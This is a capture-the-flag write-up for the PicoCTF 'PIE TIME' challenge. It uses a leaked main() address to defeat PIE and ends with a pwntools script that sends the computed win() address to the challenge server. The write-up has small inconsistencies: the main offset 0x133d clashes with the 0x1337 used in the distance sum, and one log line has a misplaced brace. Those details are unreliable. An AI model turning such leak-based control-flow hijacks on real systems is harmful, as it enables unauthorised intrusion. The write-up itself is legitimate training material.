---
title: PIE TIME
draft: false
tags:
  - pwn
  - PicoCTF
---
## Executive Summary
**Challenge**: Overwrite the return address to call `win()`.
**Obstacle**: PIE is enabled, meaning addresses change every execution.
**Solution**: Use a provided `main` address leak to calculate the PIE base and offset to `win`.

---
## Static Analysis
Analyse the binary before running it. Use `checksec` to identify protections.

```bash
HootHoot-picoctf@webshell:~/PWN/PIE_TIME$ checksec vuln
[*] '/home/HootHoot-picoctf/PWN/PIE_TIME/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Decompilation
Simple decompilation using `disas` and `info functions` within `pwndbg` itself.
- `main`
	- prints its own memory address (the "leak").
	- request user input for an address to jump to.

---
## The Vulnerability
Even though the absolute address of `win` changes, the *relative distance* between `main` and `win` remains constant.
- **Offset of `main`**: `0x133d`
- **Offset of `win`**: `0x12a7`
- **Distance**: `0x1337 - 0x12a7 = 0x96`

---
## Exploitation Strategy
The final exploitation should be able to handle information from local binary and session with remote server.
1. Locate `main` and `win` address.
2. Calculate relative distance.
3. Connect to the remote server.
4. Obtain address of `main`.
5. Calculate the relative distance address of `win` from `main`.
6. Prepare payload with `win` address and send to remote server.

---
## Final Exploit
Exploit makes use of `pwntools` to obtain information about local binary, which allowed the preparation of various address calculation required for the final payload.

```python
from pwn import *

elf = ELF('./vuln', checksec=False)
context.binary = elf

p = remote('rescued-float.picoctf.net', 56740)

p.recvuntil(b'main: ')
main_leak = int(p.recvline(), 16)
log.info(f'Remote main leak: hex(main_leak))')

local_main_addr = elf.symbols['main']
local_win_addr = elf.symbols['win']
distance = local_main_addr - local_win_addr
log.info(f'Distance: {distance}')

win_addr = hex(main_leak - distance)
log.info(f'Remote win address: {win_addr}')

p.sendlineafter(b'12345: ', win_addr)

p.interactive()
```